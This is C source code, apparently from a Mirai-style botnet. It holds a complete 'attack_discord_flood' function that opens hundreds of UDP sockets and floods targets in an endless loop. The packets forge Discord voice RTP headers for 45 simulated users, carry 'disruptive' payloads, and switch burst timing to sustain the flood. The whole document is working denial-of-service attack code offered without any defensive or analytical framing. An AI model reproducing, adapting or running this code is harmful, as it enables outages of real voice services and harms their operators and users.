// From unnamed Source
void attack_discord_flood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    #define MAX_SOCKETS 320
    #define USERS_TO_SIMULATE 45

    int socks[MAX_SOCKETS];
    int active_sockets = 0;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 50001); // Default Discord port
    int length = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);

    // Create and configure sockets
    for (int i = 0; i < MAX_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        active_sockets++;

        int buf_size = 524288;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
        int tos_value = (i % 2 == 0) ? 0xb8 : 0x88;
        setsockopt(socks[i], IPPROTO_IP, IP_TOS, &tos_value, sizeof(int));
        fcntl(socks[i], F_SETFL, O_NONBLOCK);

        struct sockaddr_in src;
        src.sin_family = AF_INET;
        src.sin_port = htons(1024 + (rand_next() % 64000));
        src.sin_addr.s_addr = INADDR_ANY;
        bind(socks[i], (struct sockaddr *)&src, sizeof(src));
    }

    // Discord RTP header patterns
    uint8_t discord_opus_pattern[8][16] = {
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x01},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x01},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x02},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x02},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x03},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x03},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x04},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x05}
    };

    // Per-target and per-user data
    uint32_t ssrc_values[targs_len][USERS_TO_SIMULATE];
    uint16_t seq[targs_len][USERS_TO_SIMULATE];
    uint32_t ts[targs_len][USERS_TO_SIMULATE];
    uint32_t base_ts = (uint32_t)time(NULL) * 48000;

    for (int t = 0; t < targs_len; t++) {
        for (int u = 0; u < USERS_TO_SIMULATE; u++) {
            uint8_t first_octet = (ntohl(targs[t].addr) >> 24) & 0xFF;
            bool is_discord_infra = (first_octet == 66);
            ssrc_values[t][u] = is_discord_infra ? (0x12345000 + (rand_next() % 0xFFF)) : (0x10000000 + (rand_next() % 0xEFFFFFFF));
            seq[t][u] = rand_next() % 1000;
            ts[t][u] = base_ts + (t * USERS_TO_SIMULATE + u) * 960;
        }
    }

    // Disruptive payloads
    uint8_t disruptive_payloads[7][140];
    for (int i = 0; i < 140; i++) {
        disruptive_payloads[0][i] = (i % 4 == 0) ? 0xFC : (i % 4 == 1) ? 0xFF : (i % 4 == 2) ? 0x01 : 0x00;
        disruptive_payloads[1][i] = (i * 17) & 0xFF;
        disruptive_payloads[2][i] = (i < 4) ? ((i == 0) ? 0xF8 : 0xA0) : (i % 2 == 0) ? 0xAA : 0x55;
        disruptive_payloads[3][i] = (i < 10) ? (0x80 + (i % 16)) : (i < 20) ? (0xF0 + (i % 16)) : (((i % 8) < 4) ? 0xCC : 0x33);
        disruptive_payloads[4][i] = (i < 5) ? (0xB8 - i) : (((i * 7) + 13) & 0xFF);
        disruptive_payloads[5][i] = (i < 8) ? ((i == 0) ? 0xFC : (i == 1) ? 0x01 : ((i % 2) ? 0xA0 : 0x50)) : (((i * 13) + (i % 7)) & 0xFF);
        disruptive_payloads[6][i] = (i < 3) ? ((i == 0) ? 0xF8 : (i == 1) ? 0x01 : 0x00) : ((i % 20 < 10) ? (0x40 + (i % 64)) : ((i % 30 == 0) ? 0xFF : 0x10));
    }

    char packet[200];
    int phase = 0;
    int phase_counter = 0;
    struct timespec last_time, current_time;
    clock_gettime(CLOCK_MONOTONIC, &last_time);

    int phase_duration[6] = {80, 120, 60, 100, 40, 150}; // Default to Discord infra pattern

    while (true) {
        clock_gettime(CLOCK_MONOTONIC, &current_time);
        long elapsed_ms = ((current_time.tv_sec - last_time.tv_sec) * 1000) + 
                          ((current_time.tv_nsec - last_time.tv_nsec) / 1000000);
        phase_counter += elapsed_ms;
        last_time = current_time;

        if (phase_counter >= phase_duration[phase]) {
            phase = (phase + 1) % 6;
            phase_counter = 0;
        }

        int sleep_time = (phase == 0 || phase == 3 || phase == 4) ? 1 : (phase == 1) ? 2 : (phase == 2) ? 4 : 3;
        usleep(sleep_time * 1000);

        int base_bursts = (phase == 0) ? 25 : (phase == 1) ? 18 : (phase == 2) ? 10 : (phase == 3) ? 22 : (phase == 4) ? 24 : 16;

        for (int t = 0; t < targs_len; t++) {
            struct sockaddr_in *sin = &targs[t].sock_addr;
            sin->sin_port = htons(dport);

            uint8_t first_octet = (ntohl(targs[t].addr) >> 24) & 0xFF;
            bool is_discord_infra = (first_octet == 66);
            int packet_size = (length > 0 && length <= 200) ? length : (is_discord_infra ? 160 : 145);

            for (int i = 0; i < active_sockets; i++) {
                if (socks[i] < 0) continue;
                for (int user = 0; user < USERS_TO_SIMULATE; user++) {
                    int pattern_idx = rand_next() % (is_discord_infra ? 8 : 6);
                    int payload_idx = rand_next() % (is_discord_infra ? 7 : 5);

                    memcpy(packet, discord_opus_pattern[pattern_idx], 16);
                    packet[2] = (seq[t][user] >> 8) & 0xFF;
                    packet[3] = seq[t][user] & 0xFF;
                    seq[t][user]++;
                    packet[4] = (ts[t][user] >> 24) & 0xFF;
                    packet[5] = (ts[t][user] >> 16) & 0xFF;
                    packet[6] = (ts[t][user] >> 8) & 0xFF;
                    packet[7] = ts[t][user] & 0xFF;
                    ts[t][user] += 960;
                    packet[8] = (ssrc_values[t][user] >> 24) & 0xFF;
                    packet[9] = (ssrc_values[t][user] >> 16) & 0xFF;
                    packet[10] = (ssrc_values[t][user] >> 8) & 0xFF;
                    packet[11] = ssrc_values[t][user] & 0xFF;
                    size_t copy_size = (packet_size - 16 < 140) ? packet_size - 16 : 140;
                    memcpy(packet + 16, disruptive_payloads[payload_idx], copy_size);

                    int bursts = base_bursts + (user % 5) - 2;
                    if (bursts < 6) bursts = 6;

                    for (int k = 0; k < bursts; k++) {
                        sendto(socks[i], packet, packet_size, MSG_NOSIGNAL, (struct sockaddr *)sin, sizeof(*sin));
                        if (k % 3 == 0) {
                            packet[3] = (seq[t][user] + 1) & 0xFF;
                            packet[7] = (ts[t][user] + 960) & 0xFF;
                            sendto(socks[i], packet, packet_size, MSG_NOSIGNAL, (struct sockaddr *)sin, sizeof(*sin));
                        }
                    }
                }
            }
        }
    }
}
